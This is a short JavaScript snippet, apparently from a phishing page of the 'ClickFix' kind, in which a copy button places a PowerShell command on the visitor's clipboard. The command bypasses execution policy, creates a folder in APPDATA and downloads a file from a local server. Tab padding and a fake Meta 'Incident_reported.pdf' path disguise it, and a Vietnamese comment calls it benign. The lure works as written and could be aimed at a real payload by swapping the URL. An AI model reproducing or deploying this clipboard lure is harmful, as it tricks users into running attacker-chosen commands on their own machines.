document.getElementById("copy").addEventListener("click", () => {
  // Payload benign: tải meta từ web và set registry
  const cmd = `cmd /c powershell -NoLogo -ExecutionPolicy Bypass -Command "New-Item -ItemType Directory -Force -Path $env:APPDATA\\MetaTest; iwr http://127.0.0.1:8000/assets/img/wallpaper.png -OutFile $env:APPDATA\\MetaTest\\incident.png";\t\t\t\t\t\tC:\\Users\\Default\\Documents\\Meta\\Facebook\\Shared\\Incident_reported.pdf`;
  navigator.clipboard.writeText(cmd);

  // Toast effect
  const toast = document.getElementById("toast");
  toast.className = "show";
  setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 2000);
});
